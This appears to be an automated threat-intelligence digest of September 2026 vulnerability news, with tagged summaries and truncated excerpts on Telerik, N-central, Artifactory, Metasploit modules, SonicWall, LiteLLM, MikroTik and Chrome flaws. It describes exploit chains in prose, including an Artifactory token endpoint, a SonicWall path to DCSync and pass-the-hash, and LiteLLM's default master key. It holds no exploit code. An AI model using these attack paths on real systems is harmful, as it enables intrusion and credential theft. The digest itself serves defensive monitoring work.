#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- cve_ids: CVE-2026-13181, CVE-2026-13182, CVE-2026-13183
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- cve_ids: CVE-2026-13181, CVE-2026-13182, CVE-2026-13183
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities
```

#### Full body

```
Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released  Swati Khandelwal  Sep 07, 2026 Vulnerability / Web Security A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities in Telerik UI for ASP.NET AJAX that can allow an unauthenticated attacker to execute remote code on the server hosting a vulnerable application. Progress Software patched the flaws in July, and exploitation requires a non-default configuration — but the release pairs a detailed write-up with a ready-to-run tool and two payloads, putting a complete attack path in public hands for the first time. The underlying flaws are not new. Progress shipped the fix in version 2026.2.708 (2026 Q2 SP1) on July 8 and published the CVEs and advisory on July 22. What changed on September 7 is the disclosure of the method and the tooling: TantoSec's Marcio Almeida walked through the full chain and released a command-line tool, telerik-rau-exploit, along with two mixed-mode DLL payloads — one that writes a web shell to disk and one that runs entirely in memory. The chain affects the RadAsyncUpload file-upload control in versions 2010.1.309 through 2026.2.519, according to Progress's advisory ; 2026.2.708 and later are fixed. The most serious of the bugs, an unguarded type-resolution flaw tracked as CVE-2026-13181 , carries a CVSS score of 8.1 ("high"); its "high" attack-complexity rating reflects the configuration prerequisites described below rather than any difficulty in exploitation once they are met. Running an affected version is not enough to be exploitable. TantoSec says the chain has "preconditions that are not met by a default installation": a page must render a RadAsyncUpload control whose server-side handler reads the upload result, and the application must be configured with an explicit, non-default encryption key for the control — which, in a twist, is a setting Telerik recommends as hardening. Sites on an affected version without both conditions are not exploitable through this chain. Where those conditions hold, the payoff is code execution with the privileges of the IIS application pool. The entry point is a padding oracle (CVE-2026-13182): because the control encrypts its client-side state with AES-CBC and no integrity check, the server responds differently to tampered data depending on whether the decrypted bytes have valid padding or merely fail to parse as JSON. That difference lets an attacker decrypt — and, with a technique TantoSec built around the control's fixed encryption seed, forge — the encrypted upload configuration without ever knowing the key. The same forgery allows the attacker to name an arbitrary .NET type, which the control resolves without an allowlist (CVE-2026-13181) and deserializes into a gadget that loads a DLL from a location the attacker controls. The uploaded DLL is a mixed-mode assembly that runs native code as soon as it loads. It is not instant: TantoSec's end-to-end run took roughly 127,000 oracle requests — about an hour against a lab target, and longer against a rate-limited server. If the application hides detailed error messages, the oracle can still be read through response timing, a variant tracked as CVE-2026-13183. There are no confirmed reports of the 2026 flaws being exploited in the wild, and none appears in CISA's Known Exploited Vulnerabilities catalog as of September 7. One attack-surface-management vendor, IONIX, states on its site that it is "tracking ongoing exploitation attempts," but it gives no dates, volumes, or other specifics, and does not distinguish exploitation from ordinary internet scanning of the handler. The component itself has a l
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Telerik UI Padding-Oracle Bug Chained to Unauthenticated RCE — Public Exploit Released
  - Published: 2026-09-07T11:20:14+00:00
  - Link: https://thehackernews.com/2026/09/telerik-ui-padding-oracle-bug-chained.html
  - Summary: A TantoSec proof-of-concept turns an AES-CBC "padding oracle" in Telerik UI for ASP.NET AJAX into unauthenticated remote code execution — but only against applications in a specific non-default configuration, and Progress patched the chain in July. There are no confirmed reports of exploitation in the wild. Security firm TantoSec has published a working exploit chain targeting vulnerabilities

### Cluster 81949698a6 — score 24

- Title: N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T08:31:12+00:00
- Link: https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-86218
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-86218
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a
```

#### Full body

```
N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw  Swati Khandelwal  Sep 07, 2026 Vulnerability / Enterprise Security Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a maximum-severity vulnerability that could allow remote code execution on the N-central server without authentication. The company's own communications disagree on whether the flaw has already been exploited. The vulnerability, tracked as CVE-2026-86218 , carries a CVSS 4.0 score of 10.0, assigned by N-able as the CVE Numbering Authority, and is classed as a static code injection weakness (CWE-96). It affects every N-central build before 2026.3.1.14, the build shipped as 2026.3 Hotfix 4 in the early hours of September 6 (UTC). That includes servers already updated to Hotfix 3 (2026.3.1.13), which N-able had published a little over eight hours earlier for two flaws that it says are unrelated to the new one. N-able said hosted N-central (NCOD) instances have already been patched. On-premises customers are told to upgrade to 2026.3.1.14 immediately; the release notes list direct upgrade paths from 2025.4, 2026.1, 2026.2, 2026.3, and the 2026.3.1 hotfixes, and say agents do not need to be upgraded to be protected from this CVE. The release notes, status post, and incident notice contain no indicators of compromise, no interim mitigation, and no detection guidance beyond a recommendation to audit N-central user accounts for unexpected users. Huntress, which has been tracking attacks on N-central since August, has advised administrators to restrict inbound access to the console with IP allowlisting or a VPN and, where a server is still reachable from the internet, to consider taking it offline until the hotfix is applied. On the question of exploitation, N-able's channels diverge. The Hotfix 4 release notes and status post state that a third party responsibly disclosed the vulnerability through the company's security disclosure program and that N-able has "no confirmations that this vulnerability has been exploited in production environments." The same release notes on N-able's documentation site also describe it as a "critical zero-day vulnerability," a term N-able does not define. N-able's incident notice on its uptime status page goes further. It says a third, independent security researcher alerted the company to a new vulnerability unrelated to the previously disclosed CVEs and that, unlike those, the newly identified flaw "has been observed being exploited in the wild." The notice does not say who observed the exploitation, where, or when, and N-able has not attributed the activity to any actor. As of September 7, the incident was still listed as open on N-able's status page, as mirrored by the status-page aggregator IsDown . The Hacker News has reached out to N-able for clarification on which statement is current and what evidence of exploitation the company holds. Huntress said it cannot settle the question from its own data. The company began investigating on September 4 after a customer's fully patched N-central production environment was compromised. It said it reproduced a proof-of-concept exploit chain against build 2026.3.1.10 that may use one or both of the two flaws later fixed in Hotfix 3, but the appliance's logs had already rotated, leaving it "unable to say whether this new CVE was the vulnerability exploited" in that intrusion. In response to questions from The Hacker News, Ben Bernstein, cybersecurity advisor at Huntress, said the "actively exploited" description in its post "is based entirely on N-able's statements," namely the incident notice and a post on the MSPGeek Discord in which N-able's Ja
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw
  - Published: 2026-09-07T08:31:12+00:00
  - Link: https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
  - Summary: Every on-premises N-central build below 2026.3.1.14 — including servers updated to Hotfix 3 a day earlier — needs Hotfix 4. N-able's incident notice says the flaw has been exploited in the wild; its release notes say that is unconfirmed. N-able has released its fourth hotfix in five weeks for the N-central remote monitoring and management (RMM) platform, this time for a

### Cluster 2c7f2421f0 — score 23

- Title: Artifactory Under Attack: In-the-Wild Exploitation of CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-10T19:04:00+00:00
- Link: https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- affected_products: AWS
- cve_ids: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- affected_products: AWS
- cve_ids: CVE-2026-42016, CVE-2026-42018, CVE-2026-82329
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities impacting JFrog Artifactory (CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329). Attackers are chaining these vulnerabilities to bypass authentication and gain administrative control.
```

#### Full body

```
Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities affecting JFrog Artifactory: CVE-2026-42016, CVE-2026-42018, and CVE-2026-82329. Attackers are chaining these vulnerabilities to bypass authentication, escalate privileges, and gain administrative control over vulnerable Artifactory instances. Observed post-exploitation activity includes the creation of persistent administrator accounts, the deployment of malicious Groovy plugins for code execution, and the installation of Rust-based backdoors to establish persistence. This blogpost provides an analysis of the exploitation patterns observed, the impact on affected organizations, and actionable guidance for security teams to detect and remediate these threats. We will continue to update this blogpost as new information becomes available. CVE-2026-42018: Exposure of an internal anonymous-user token CVE-2026-42018 is an improper-authentication vulnerability that may cause Artifactory to return an internal anonymous-user token to an unauthenticated requester, even when anonymous access is disabled. An attacker could use the exposed token to access resources available to the internal anonymous identity, potentially exposing sensitive artifacts or repository data. CVE-2026-42016: Token scope validation flaw CVE-2026-42016 is a privilege-escalation vulnerability caused by insufficient token validation. Artifactory validates the token’s signature and issuer but does not properly enforce its intended scope. As a result, an attacker with low-privileged access may be able to use a valid token to perform unauthorized actions and gain elevated privileges. CVE-2026-82329: Unauthenticated access to administrative privileges CVE-2026-82329 is a critical authentication-bypass vulnerability affecting Artifactory under its default configuration. An unauthenticated attacker with network access to a vulnerable instance may be able to obtain administrative privileges, potentially gaining complete control over the Artifactory deployment and the artifacts, credentials, and integrations it manages. What is the risk to cloud environments? Our data indicates that 67% of organizations running JFrog Artifactory had at least one vulnerable instance when CVE-2026-42016 was first published on July 27. Similar levels were observed for CVE-2026-42018 (69% at publication on Aug 12) and CVE-2026-82329 (67% at publication on Aug 28). Patching velocity has been slow for the lower-severity CVEs. As of six weeks after the first disclosure, 59% of organizations remain vulnerable to CVE-2026-42016, and CVE-2026-42018 has only declined from 69% to 62% over four weeks. However, CVE-2026-82329 has seen significantly faster remediation, dropping from 67% to 49% within two weeks of publication, likely due to its critical severity rating driving more urgent attention from security teams. What evidence of exploitation has Wiz Research identified? Wiz Research has confirmed in-the-wild exploitation of all three vulnerabilities across multiple environments. CVE-2026-42018 and CVE-2026-42016 Exploitation Between August 15 and September 8, 2026, we observed multiple actors chain CVE-2026-42018 and CVE-2026-42016 against self-hosted Artifactory instances. Across multiple cases we observed a custom Rust backdoor with C2 capabilities being dropped. Wiz Research is not aware of any prior public reporting of in-the-wild exploitation involving either CVE except for CISA KEV inclusion . Neither vulnerability grants administrative control on its own. CVE-2026-42018 exposes a token for the internal anonymous user, and CVE-2026-42016 lets that low-privileged token be escalated to admin scope. Together, the two can turn an unauthenticated request into an admin-scoped token in two steps. Every exploitation followed a similar shape. An unauthenticated POST /access/api/v1/aws/token/ with a trailing slash returned HTTP 200 with a JWT for the internal anonymous user, exploiting CVE-2
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Artifactory Under Attack: In-the-Wild Exploitation of CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329
  - Published: 2026-09-10T19:04:00+00:00
  - Link: https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201
  - Summary: Wiz Research has identified active, in-the-wild exploitation of three critical and high-severity vulnerabilities impacting JFrog Artifactory (CVE-2026-42016, CVE-2026-42018 & CVE-2026-82329). Attackers are chaining these vulnerabilities to bypass authentication and gain administrative control.

### Cluster bd90c028bc — score 23

- Title: Metasploit Wrap Up: This One Goes to Sixteen!
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-11T13:35:11+00:00
- Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2025-54988, CVE-2025-66516, SonicWall

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Cisco, SonicWall
- cve_ids: CVE-2025-54988, CVE-2025-66516, CVE-2026-15409, CVE-2026-20079, CVE-2026-20929, CVE-2026-83549
- urgency_signals: poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_5_chatter

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Cisco, SonicWall
- cve_ids: CVE-2025-66516, CVE-2025-54988, CVE-2026-20929, CVE-2026-20079, CVE-2026-83549
- urgency_signals: zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 co
```

#### Full body

```
Back to Blog Products and Tools Metasploit Wrap Up: This One Goes to Sixteen! Brendan Watters Sep 11, 2026 | Last updated on Sep 11, 2026 | 7 min read This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 contributed by jvoisin Path: scanner/http/spip_annee_sqli Description: Adds modules/auxiliary/scanner/http/spip_annee_sqli.rb which exploits a blind SQL injection in SPIP's date column escaping logic. Metasploit Payload Handler Detection (TCP/UDP/HTTP/HTTPS) Author: h00die Type: Auxiliary Pull request: #21551 contributed by h00die Path: scanner/msf/handler_detect Description: Adds a scanner module to enumerate ports on a host and determine if they're a Metasploit Reverse Handler or not, and if they are, what kind of shell they were going to land. ESC8 Relay: SMB to HTTP(S) via Kerberos Author: Pushpender Rathore Type: Auxiliary Pull request: #21709 contributed by Pushpenderrathore Path: server/relay/esc8_kerberos CVE reference: CVE-2026-20929 Description: This introduces native Kerberos authentication relay capabilities to the framework's relay stack. It includes a new auxiliary module (esc8_kerberos) that exploits CVE-2026-20929 by targeting AD CS Web Enrollment (ESC8). The module captures an SMB2 AP-REQ from a coerced client and seamlessly replays the authentication to the target certificate server over HTTP. This chain ultimately allows an attacker to issue a certificate for the coerced victim and obtain a valid Kerberos TGT without requiring their credentials. Linux x64 Sandbox Environment Gate Author: Massimo Bertocchi Type: Evasion Pull request: #21642 contributed by litemars Path: linux/x64/sandbox_gate Description: Adds a Linux x64 sandbox‑evasion module that performs lightweight runtime environment checks and aborts execution when a likely sandbox or VM is detected. Cisco Secure Firewall Management Center Authentication Bypass RCE Authors: Arian Eidizadeh, Brandon Sakai, and Cale Black Type: Exploit Pull request: #21796 contributed by CyberAuth Path: linux/http/cisco_fmc_auth_bypass_rce CVE reference: CVE-2026-20079 Description: Adds a native Metasploit exploit module for CVE-2026-20079, an unauthenticated authentication bypass in Cisco Secure Firewall Management Center (FMC). SonicWall SMA1000 WorkPlace SSRF to Root Remote Code Execution Authors: Adam Babis, William Perry, and sfewer-r7 Type: Exploit Pull request: #21883 contributed by sfewer-r7 Path: linux/http/sonicwall_sma1000_couchdb_rce CVE reference: CVE-2026-83549 Description: This adds an exploit module for the recent SonicWall SMA1000 zero-day exploit chain that was disclosed in the first week of September as being exploited in-the-wild. CVE-2026-83548 is an SSRF used to bypass auth. SMA1000-9427 is an RCE with low privileges via CouchDB read/write primitives. CVE-2026-83549 is a command injection in cmsSnmpTrap.sh for RCE with root privs. The patched version 12.5.0-02952 has been verified to successfully remediate this exploit chain. JetBrains TeamCity Agent Polling Unauthenticated Remote Code Execution Authors: Antoni Tremblay an
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: This One Goes to Sixteen!
  - Published: 2026-09-11T13:35:11+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-goes-to-sixteen
  - Summary: This One Goes to Sixteen! Another banger from Metasploit with sixteen new modules, including ten exploit modules, with five on the CISA KEV list. Cisco, Papercut, Sonicwall, Jetbrains, and Langflow all have exploit modules, and not to be outdone, we even have a Metasploit scanner to watch the watchers! New module content (16) Elasticsearch ingest-attachment Apache Tika XFA XXE Local File Read Authors: Bourbon Offensive Security Services and Jean-Marie Bourbon Type: Auxiliary Pull request: #21739 contributed by kmkz Path: scanner/http/elasticsearch_tika_xfa_xxe CVE reference: CVE-2025-66516 Description: Adds an auxiliary scanner module for CVE-2025-54988/CVE-2025-66516. The module validates an XML External Entity (XXE) vulnerability in Apache Tika's XFA parser exposed through the Elasticsearch attachment ingest processor. SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass Authors: Benoit Hua, Franck Chevalier, Julien Voisin, and ka3n1x Type: Auxiliary Pull request: #21791 co
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: 🕵️‍♂️ SonicWall SMA1000 (CVE-2026-15409): SSRF to Erlang RCE chained into automated DCSync from the appliance
  - Published: 2026-09-10T17:48:31+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wcqbvq/sonicwall_sma1000_cve202615409_ssrf_to_erlang_rce/
  - Summary: CVE-2026-15409 is an unauthenticated SSRF in the SMA1000 WorkPlace interface. The chain is the interesting part. The /wsproxy WebSocket endpoint is used to reach a locally bound Erlang distribution node ( couchdb@127.0.0.1 on port 1050), the Erlang handshake is completed with a hardcoded cookie, and os:cmd() gives command execution as the couchdb user. From there the operator read policy_file.xml, decrypted the stored LDAP bind passwords (static 32-byte AES key lifted from ASAPPasswordUtil.class bytecode), and dropped a standalone Linux build of Impacket secretsdump to /tmp on the appliance. secretsdump then ran from the SonicWall itself against internal DCs, with DCSync automated using recovered LDAP creds and, more effectively, domain-controller machine-account hashes for pass-the-hash. The exploit is a direct refactor of Rapid7's public PoC, reworked for unattended bulk use. Full chain, scripts and IOCs in the writeup. https://hunt.io/blog/sonicwall-sma1000-uk-council-attack submitt

### Cluster 462fbf5ade — score 22

- Title: Off Guard: Breaking LiteLLM from authentication bypass to cloud compromise
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-09T16:06:00+00:00
- Link: https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft
- affected_products: AWS, Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-59821, CVE-2026-59822
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, active_exploitation
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, AWS
- cve_ids: CVE-2026-59822, CVE-2026-59821
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
How default keys, unauthenticated MCP sessions, and custom code guardrails expose cloud AI infrastructure to root-level remote code execution and IAM theft.
```

#### Full body

```
Nearly 1 in 10 publicly accessible LiteLLM instances accept a default master key or require no authentication at all. We found this while scanning roughly 3,000 internet-facing deployments of the most popular open-source LLM gateway. The usual concern with that kind of exposure is LLMjacking -someone using the credentials to run API calls on your bill - however, we wanted to check whether an attacker could do worse than that: could they achieve code execution on the host? Furthermore, could they exploit this to compromise the wider environment? We decided to use Claude Code to work through LiteLLM's codebase, looking for features that accept user-controlled input and pass it to an execution context. We found multiple issues, as detailed below. Key findings: MCP authentication bypass via the MCP endpoint (CVE-2026-59822) - an arbitrary Bearer token can create a valid session; confirmed as exploitable across hundreds of Internet-facing instances. Post-auth root-level remote code execution via LiteLLM's custom code guardrails (CVE-2026-59821). 9.6% of 3,074 public instances (at the time of this research) accepted the default master key ( sk-1234 ) or required no authentication at all. In these cases, the RCE is effectively pre-auth. Unauthenticated access as admin by default (no CVE assigned; fixed alongside CVE-2026-59821) - when no authentication is configured, all users are granted PROXY_ADMIN access. Post-auth cloud credential theft vector via the pass-through endpoint feature, as it lacks URL validation. This isn’t considered a vulnerability and therefore wasn’t fixed or assigned a CVE, meaning the technique remains abusable in post-auth scenarios. However, similarly to the above, when chained with a default master key or missing authentication, this is effectively pre-auth. All vulnerabilities have since been responsibly disclosed to LiteLLM and have patches available. CVE-2026-59822 has been added to CISA's Known Exploited Vulnerabilities catalog, and we observed it being exploited in the wild via our honeypot infrastructure. This research was previously presented at DEF CON 34. Background: What is LiteLLM? LiteLLM is an open-source AI gateway that provides a unified OpenAI-compatible API for over 100 LLM providers, including OpenAI, Anthropic, AWS Bedrock, Azure, and Google Vertex AI. Organizations route their LLM traffic through it so they can centrally manage their API keys, enforce budgets, apply guardrails, monitor usage, etc. LiteLLM is one of the most popular open-source AI gateways, present in approximately one-third of cloud environments according to Wiz data. LiteLLM can hold API keys for every configured LLM provider, process every prompt and response that flows through it, and connect to external tools via MCP. A compromised LiteLLM instance means compromised AI infrastructure, and, as we'll show, often the cloud environment it runs in. The conventional risk model for this is LLMjacking: an attacker makes API calls on the organization's behalf, runs up costs, and exfiltrates whatever provider keys are configured. While this is indeed a proven real-world risk, LiteLLM isn't just a credential store. It executes server-side Python on every inference request, can proxy requests to arbitrary internal URLs, and connects to internal tools and systems via MCP. Therefore, we wanted to know what an attacker could actually do with a compromised instance beyond just API abuse. Searching for Attack Paths Using Claude Code, we went through guardrails, pass-through endpoints, model configuration, hook systems, and the MCP layer. Three features had obvious attack surface: MCP authentication handler ( user_api_key_auth_mcp.py ): a separate auth path for the Model Context Protocol endpoint Custom code guardrails ( guardrail_endpoints.py ): administrators submit Python code that the server passes to exec(compile(...)) Pass-through endpoints ( pass_through_endpoints.py ): proxy routes that forward requests to arbitrary URLs with n
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Off Guard: Breaking LiteLLM from authentication bypass to cloud compromise
  - Published: 2026-09-09T16:06:00+00:00
  - Link: https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
  - Summary: How default keys, unauthenticated MCP sessions, and custom code guardrails expose cloud AI infrastructure to root-level remote code execution and IAM theft.

### Cluster aa7b1774d3 — score 20

- Title: Critical MikroTik Vulnerability - Patch Now, (Sun, Sep 6th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-06T21:43:17+00:00
- Link: https://isc.sans.edu/diary/rss/33314
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Summary

```
Mikrotik released a patch late last week for an already-exploited vulnerability. The vulnerability allows an SSH authentication bypass and is already being exploited. At this point, assume compromise. Attackers have been adding new accounts to affected devices to maintain access after a patch is installed.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Critical MikroTik Vulnerability - Patch Now, (Sun, Sep 6th)
  - Published: 2026-09-06T21:43:17+00:00
  - Link: https://isc.sans.edu/diary/rss/33314
  - Summary: Mikrotik released a patch late last week for an already-exploited vulnerability. The vulnerability allows an SSH authentication bypass and is already being exploited. At this point, assume compromise. Attackers have been adding new accounts to affected devices to maintain access after a patch is installed.

### Cluster aa9e62a68c — score 20

- Title: Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T09:11:03+00:00
- Link: https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-87491

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education, government
- affected_products: AWS, OpenAI/ChatGPT
- cve_ids: CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281, CVE-2026-87491
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: government, education
- affected_products: OpenAI/ChatGPT, AWS
- cve_ids: CVE-2026-87491, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to
```

#### Full body

```
Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Browser Security Google on Tuesday released updates to patch 230 security vulnerabilities, including one that has come under active exploitation in the wild. The medium-severity vulnerability, assigned the CVE identifier CVE-2026-87491 (CVSS score: N/A), has been described as an out-of-bounds bug in V8, Chrome's JavaScript and WebAssembly engine. "Out-of-bounds write in V8 in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page," reads a description of the flaw on the NIST National Vulnerability Database (NVD). Security researcher Jihyeon Jeong of Compsec Lab, Seoul National University, has been acknowledged for discovering and reporting the flaw on August 6, 2026. The researcher received a $2,500 bug bounty reward for responsible disclosure. Google acknowledged it is "aware that an exploit for CVE-2026-87491 exists in the wild," but has not disclosed any additional specific information related to how it's being weaponized in real-world attacks and who is behind them. "Access to bug details and links may be kept restricted until a majority of users are updated with a fix," the tech giant added. "We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven’t yet fixed." With the latest development, Google has addressed a total of seven actively exploited Chrome zero-days since the start of the year. This includes CVE-2026-2441 , CVE-2026-3909, CVE-2026-3910 , CVE-2026-5281 , CVE-2026-11645 , and CVE-2026-85046 . Besides CVE-2026-87491, the latest update also fixes five critical security flaws in WebGL and Cast components - CVE-2026-87464 - Use-after-free in WebGL CVE-2026-87488 - Use-after-free in WebGL CVE-2026-87438 - Out-of-bounds write in WebGL CVE-2026-87527 - Buffer overflow in WebGL CVE-2026-87628 - Use-after-free in Cast Google said it reported 195 out of the 230 flaws that have been addressed in the update. One high use-after-free flaw in WebPackaging (CVE-2026-87639) is credited to OpenAI Codex Security. "Many of our security bugs are detected using AddressSanitizer , MemorySanitizer , UndefinedBehaviorSanitizer , Control Flow Integrity , libFuzzer , or AFL ," the company added. For optimal protection, users are advised to update their Chrome browser to versions 153.0.8010.36/.37 for Windows and Apple macOS, and 153.0.8010.36 for Linux. To ensure the latest updates are installed, users can navigate to More > Help > About Google Chrome and select Relaunch. Users of other Chromium-based browsers, such as Microsoft Edge, Brave, Opera, and Vivaldi, are also advised to apply the fixes as and when they become available. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 9, 2026, added CVE-2026-87491 to its Known 